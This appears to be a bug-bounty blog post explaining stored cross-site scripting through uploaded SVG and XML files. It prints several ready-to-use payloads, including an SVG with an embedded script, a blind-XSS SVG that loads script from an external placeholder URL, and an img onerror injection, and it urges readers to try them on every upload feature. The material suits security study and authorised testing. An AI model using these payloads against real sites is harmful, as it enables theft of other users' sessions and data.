# Stored XSS via File upload(using svg file)

- **Source URL:** https://medium.com/@paxnull/stored-xss-via-file-upload-using-svg-file-c1e2a33ed8a8?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@paxnull
- **Fetched:** 2026-11-16
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 4835)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hi guys.. In this blog I will explain a vulnerability called stored xss via file upload via an svg file…

### What is Stored XSS?

Stored Cross-Site Scripting (XSS) is a type of web vulnerability where malicious scripts are injected into a website’s database. When users access a compromised page, these scripts execute, potentially leading to unauthorized access, data theft, or other security breaches.

*for example:*

Attacker injects malicious code into a website’s user-input fields, such as text boxes, Name or address and forms. This injected script is then stored in the website’s database. When other users access the affected page, the stored script executes in their browsers, potentially leading to serious security issues like data theft and unauthorized access.

test"/>\<img src=x onerror=prompt(1);>.

### What is Stored XSS via File Upload and How it Works?

Stored XSS via file upload happens when an attacker uploads a file containing malicious scripts to a website. When other users view the uploaded content, these scripts execute, posing risks like data theft and unauthorized access.

*for example:*

A social media app allowing image uploads, the *attacker* uploads a seemingly innocent file embedded with malicious code. When others view the image, the code execute in their browsers, enabling the *attacker* to steal information or control accounts without permission.

*Scenario:*

1. )Attacker joins a social media platform and adds a profile picture which have a malicious payload,( *it can be anything as soon as there is a file upload feature*).
2.)The platform saves Attacker picture, including the hidden malicious script, in its database.
3.)Later, when Victim checks out Attacker profile, the malicious script executed in Victim browser. Without knowing, Victim might experience strange pop-ups or even unknowingly perform actions on the platform.

In simpler terms, Attacker tricks the social media platform by adding a malicious file to his profile picture. When others view his profile, the script does things in the background, causing unexpected outcomes. It’s like a digital magic trick, but with potential risks!

example of xss payload:

\<?xml version="1.0" standalone="no"?>

\<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

\<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">

\<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

\<script type="text/javascript">

alert("XSS by PAXNULL");

\</script>

\</svg>

save it like xss.svg

**bonus:**

Blind xss via svg file is possible too.

[https://gist.github.com/ioribrn/aafd49c7c3a5cc7e1ba4848b75a52f4b](https://gist.github.com/ioribrn/aafd49c7c3a5cc7e1ba4848b75a52f4b)

\<?xml version="1.0" standalone="no"?>

\<!DOCTYPE svg PUBLIC

"-//W3C//DTD SVG 1.1//EN"

"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

\<svg width="200"

height="200"

zoomAndPan="disable"

xmlns="http://www.w3.org/2000/svg"

xmlns:xlink="http://www.w3.org/1999/xlink"

xml:space="preserve">

\<!-- Script linked from the outside-->

\<script xlink:href="https://your-urls-here" />

\<script>

//\<!\[CDATA\[

alert("ble");

\]\]>

\</script>

\</svg>

xss payload via xml file

\<html>

\<head>\</head>

\<body>

\<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)\</something:script>

\</body>

\</html>

Always try to upload files containing payloads on every part that have a file upload functionality.

Also note that xss is not the only one possible via file upload, it can be ssrf, rce, sqli and more…

*Resources:*

Connect with me on twitter: [https://twitter.com/Usernamenullll](https://twitter.com/Usernamenullll)
